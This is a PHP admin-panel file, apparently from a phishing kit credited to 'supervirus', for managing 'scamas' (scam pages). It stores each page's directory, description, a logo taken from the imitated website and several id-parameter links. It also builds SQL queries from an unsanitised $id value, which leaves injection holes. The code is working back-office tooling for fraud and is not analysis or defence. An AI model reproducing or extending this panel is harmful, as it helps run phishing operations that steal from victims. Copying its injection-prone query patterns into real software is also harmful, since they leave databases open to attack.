<?
// ################################
// #                                                             
// #  ======== Programming By supervirus ===========  
// #
// #    The Scripet Progeramed By super virus 
// #
// #  Copyright © 2011 super virus . All Rights Reserved. 
// #
// #  If you want any support vist this site.           
// #      https://www.facebook.com/l0ldz 
// #
// ################################
if(user_level != 2){
		echo'<div class="head_panel">.: Scamas Control :.</div>	
			<div class="body_panel">
				You Don\'t Have Permoton To Accés To This Page 
			</div>
				'.redirect();
}else{
switch($type){
	case 'add_scama':
	echo '<div class="head_panel">Add New Scama</div>	
			<div class="body_panel">
				<form method="POST" action="index.php?do=scama&type=add_scama_up">
					<table class="tb" border="0" cellpadding="0" cellspacing="0" width="100%">
						<tr class="tr1">
							<td>Scama Directory</td>
							<td width="303"> 
							<input class="inpt" name="dir_scama" size="63"></td>
						</tr>
						<tr class="tr2">
							<td>Scama Discription</td>
							<td width="303"> 
							<input class="inpt" name="disc_scama" size="63"></td>
						</tr>
						<tr class="tr1">
							<td>Website Logo</td>
							<td width="303"> 
							<input class="inpt" name="url_image_scama" size="63"></td>
						</tr>
						<tr class="tr2">
							<td valign="top">Scama Links<p>
							<font size="1" color="#00FFFF"><b>Must be Like : http://www.xxxx.com/index.php?id= 
							<br /> Or Like : http://www.xxxx.com/?id=
							</b></font>
						</td>
							<td width="303"> 
							<input class="inpt" name="url_page_scama" size="63"><input class="inpt" name="url_page_scama1" size="63"><input class="inpt" name="url_page_scama2" size="63"><input class="inpt" name="url_page_scama3" size="63"></td>
						</tr>
						<tr class="tr1">
							<td colspan="2">
								<div align="center">
								<input align="center" class="btn" type="submit" value="Add This Scama" >
								</div>
						</td>
						</tr>
					</table>
				</form>
			</div>';
	break;
	case 'edit_scama':
	$code_sql = "SELECT * FROM ".prifex."scamas WHERE scama_id  = '$id'";
	$sqlscamainfo = mysql_query($code_sql) or die(error_sql(mysql_error(),__LINE__,__FILE__));
	$numsqlscamainfo = mysql_num_rows($sqlscamainfo);
if($numsqlscamainfo > 0){	
	$rowscamainfo = mysql_fetch_object($sqlscamainfo);
	$scama_id = $rowscamainfo->scama_id;
	$scama_desc = $rowscamainfo->scama_desc;
	$scama_url = $rowscamainfo->scama_url;
	$scama_url1 = $rowscamainfo->scama_url1;
	$scama_url2 = $rowscamainfo->scama_url2;
	$scama_url3 = $rowscamainfo->scama_url3;
	$scama_photo = $rowscamainfo->scama_photo;
	$scama_dir = $rowscamainfo->scama_dir;
	mysql_free_result($sqlscamainfo);
	echo '<div class="head_panel">Edit Scama ( '.$scama_desc.' )</div>	
			<div class="body_panel">
				<form method="POST" action="index.php?do=scama&type=edit_scama_up">
					<table class="tb" border="0" cellpadding="0" cellspacing="0" width="100%">
						<tr class="tr1">
							<td>Scama Directory</td>
							<td width="303"> 
							<input class="inpt" name="dir_scama" value="'.$scama_dir.'" size="60"  />
							<input type="hidden" name="scama_id" value="'.$scama_id.'"  /></td>
						</tr>
						<tr class="tr2">
							<td>Scama Discription</td>
							<td width="303"> 
							<input class="inpt" name="disc_scama" value="'.$scama_desc.'" size="60" /></td>
						</tr>
						<tr class="tr1">
							<td valign="top">Website Logo</td>
							<td width="303"> 
							<input class="inpt" name="url_image_scama" value="'.$scama_photo.'" size="60" />
							<img border="0" src="'.$scama_photo.'" />
							</td>
						</tr>
						<tr class="tr2">
							<td valign="top">Scama Links<p>
							<font size="1" color="#00FFFF"><b>Must be Like : http://www.xxxx.com/index.php?id= 
							<br /> Or Like : http://www.xxxx.com/?id=
							</b></font>
						</td>
							<td width="303"> 
							<input class="inpt" name="url_page_scama" value="'.$scama_url.'" size="60"  />
							<input class="inpt" name="url_page_scama1" value="'.$scama_url1.'" size="60"  />
							<input class="inpt" name="url_page_scama2" value="'.$scama_url2.'" size="60"  />
							<input class="inpt" name="url_page_scama3" value="'.$scama_url3.'" size="60"  />
							</td>
						</tr>
						<tr class="tr1">
							<td colspan="2">
								<div align="center">
								<input align="center" class="btn" type="submit" value="Edit This Scama" >
								</div>
						</td>
						</tr>
					</table>
				</form>
			</div>';
	}else{
	echo '
	<div class="head_panel">.: Scamas Control :.</div>	
	<div class="body_panel">
		This Id Of Scama Are Wrong ! 
	</div>';	
	}
	break;
	case 'edit_scama_up':
	$dir_scama = htmlspecialchars($_POST['dir_scama']);
	$url_page_scama = htmlspecialchars($_POST['url_page_scama']);
	$url_page_scama1 = htmlspecialchars($_POST['url_page_scama1']);
	$url_page_scama2 = htmlspecialchars($_POST['url_page_scama2']);
	$url_page_scama3 = htmlspecialchars($_POST['url_page_scama3']);
	$url_image_scama = htmlspecialchars($_POST['url_image_scama']);
	$disc_scama = htmlspecialchars($_POST['disc_scama']);
	$scama_id = intval($_POST['scama_id']);
	$cod_sql_edit_scama_up = "UPDATE ".prifex."scamas SET";
	$cod_sql_edit_scama_up .= " scama_desc = '$disc_scama',";
	$cod_sql_edit_scama_up .= " scama_url = '$url_page_scama',";
	$cod_sql_edit_scama_up .= " scama_url1 = '$url_page_scama1',";
	$cod_sql_edit_scama_up .= " scama_url2 = '$url_page_scama2',";
	$cod_sql_edit_scama_up .= " scama_url3 = '$url_page_scama3',";
	$cod_sql_edit_scama_up .= " scama_photo = '$url_image_scama',";
	$cod_sql_edit_scama_up .= " scama_dir = '$dir_scama'";
	$cod_sql_edit_scama_up .= " WHERE scama_id ='$scama_id' ";
	$sql_select_scama_id = @mysql_query($cod_sql_edit_scama_up) or die (error_sql(mysql_error(),__LINE__,__FILE__));
	echo '
		<div class="head_panel">.: Scamas Control :.</div>	
		<div class="body_panel">
			Edit Scama Is Done  
		</div>';
	redirect();
	break;
	case 'add_scama_up':
	$dir_scama = htmlspecialchars($_POST['dir_scama']);
	$url_page_scama = htmlspecialchars($_POST['url_page_scama']);
	$url_page_scama1 = htmlspecialchars($_POST['url_page_scama1']);
	$url_page_scama2 = htmlspecialchars($_POST['url_page_scama2']);
	$url_page_scama3 = htmlspecialchars($_POST['url_page_scama3']);
	$url_image_scama = htmlspecialchars($_POST['url_image_scama']);
	$disc_scama = htmlspecialchars($_POST['disc_scama']);
	$sqldoaddscama = "INSERT INTO ".prifex."scamas (scama_id,scama_desc,scama_url,scama_url1,scama_url2,scama_url3,scama_photo,scama_dir)VALUES (NULL,";
	$sqldoaddscama .= "'$disc_scama', '$url_page_scama', '$url_page_scama1', '$url_page_scama2', '$url_page_scama3', '$url_image_scama', '$dir_scama')";
	$sqlqueryaddscama = mysql_query($sqldoaddscama) or die(error_sql(mysql_error(),__LINE__,__FILE__));
	echo '<div class="head_panel">.: Scamas Control :.</div>	
		<div class="body_panel">
			Add Scama Is Done  
		</div>';
	redirect();	
	break;
	case 'delet_scama':
	if(user_level == 2 and user_id == 1){
	$cod_sql_delet = "DELETE FROM ".prifex."scamas WHERE scama_id = '$id'";
	$sql_delet_scama = @mysql_query($cod_sql_delet) or die (error_sql(mysql_error(),__LINE__,__FILE__));
	echo '<div class="head_panel">.: Scamas Control :.</div>	
		<div class="body_panel">
			Delet Scama Is Done  
		</div>';
	redirect();
	}else{
	echo '<div class="head_panel">.: Scamas Control :.</div>	
		<div class="body_panel">
			You Don\'t Have Permoton To Accés To This Page 
		</div>';
	redirect();
	}
	break;
	
}
}
?>